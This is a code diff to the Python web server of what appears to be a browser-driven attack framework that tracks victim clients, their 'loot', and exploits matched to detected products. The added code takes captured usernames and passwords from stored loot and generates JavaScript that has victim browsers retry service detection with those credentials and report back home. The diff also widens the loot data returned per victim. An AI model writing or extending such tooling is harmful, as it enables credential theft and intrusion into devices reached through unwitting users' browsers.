@@ -122,7 +122,7 @@ class Webserver:
 
         self.app.add_route(
             self.service_detection,
-            "/service/detection/<rhost>/<localip>/<localport:int>",
+            "/service/detection/<rhost>",
             methods=["POST"]
         )
 
@@ -252,11 +252,6 @@ class Webserver:
         clientid = misc.hostname2id(host)
         response = await ipc.async_http_raw(
             "POST",
-            SOCK_MODULES,
-            "/module/finished/{}/{}".format(clientid, modid)
-        )
-        response = await ipc.async_http_raw(
-            "POST",
             SOCK_DATABASE,
             "/append/value/{}/{}/{}".format(clientid, result, modid)
         )
@@ -339,7 +334,6 @@ class Webserver:
             "/get/value/{}/parent".format(child)
         )
         if ipc.response_valid(response, dict):
-            logger.info(response["text"])
             rparent = response["text"].get("parent", None)
             if rparent == None or rparent != parent:
                 return False
@@ -351,22 +345,16 @@ class Webserver:
         parentid = self.host2clientid(request)
         ret = await self.is_child(parentid, clientid)
         if ret is True:
-            resp1 = await ipc.async_http_raw(
-                "GET",
-                SOCK_DATABASE,
-                "/get/json/{}/dump".format(clientid)
-            )
-            resp2 = await ipc.async_http_raw(
-                "GET",
-                SOCK_DATABASE,
-                "/get/json/{}/loot".format(clientid)
-            )
             ret = {}
-            if ipc.response_valid(resp1, dict):
-                ret["dump"] = resp1["text"]
-
-            if ipc.response_valid(resp2, dict):
-                ret["loot"] = resp2["text"]
+            keys = ["dump", "loot", "matched_modules", "failed", "success", "product"]
+            for key in keys:
+                resp = await ipc.async_http_raw(
+                    "GET",
+                    SOCK_DATABASE,
+                    "/get/json/{}/{}".format(clientid, key)
+                )
+                if ipc.response_valid(resp, dict) or ipc.response_valid(resp, list):
+                    ret[key] = resp["text"]
 
             return sanic.response.json(ret)
         else:
@@ -440,6 +428,18 @@ class Webserver:
     async def store_loot(self, request, host):
         clientid = misc.hostname2id(host)
         data = request.json
+
+        if "USERNAME" in data and "USERPASS" in data:
+            jscode = """Network.request_sd("GET", "/", null, function(xhr) {{
+            TalkHome.service_detection(xhr, "{}", "{}")}}, "{}", "{}");""".format(
+                request.host, host, data["USERNAME"], data["USERPASS"]
+            )
+
+            res = await self.store_exploit(clientid,jscode.encode())
+            if ipc.response_valid(res, dict) is False:
+                logger.error("Unable to store new service detection: {}".format(res));
+
+
         response = await ipc.async_http_raw(
             "POST",
             SOCK_DATABASE,
@@ -584,7 +584,7 @@ class Webserver:
             return True
         return False
 
-    async def service_detection(self, request, rhost, localip, localport):
+    async def service_detection(self, request, rhost):
         home = request.headers["Host"]
         clientid = misc.hostname2id(rhost)
 
@@ -626,7 +626,7 @@ class Webserver:
                     "/search/exploits/product?" + urlencode(match)
                 )
                 if ipc.response_valid(response, list):
-                    exploits = response["text"]
+                    exploits = list(set(response["text"]))
                     tmp = await ipc.async_http_raw(
                         "POST",
                         SOCK_DATABASE,
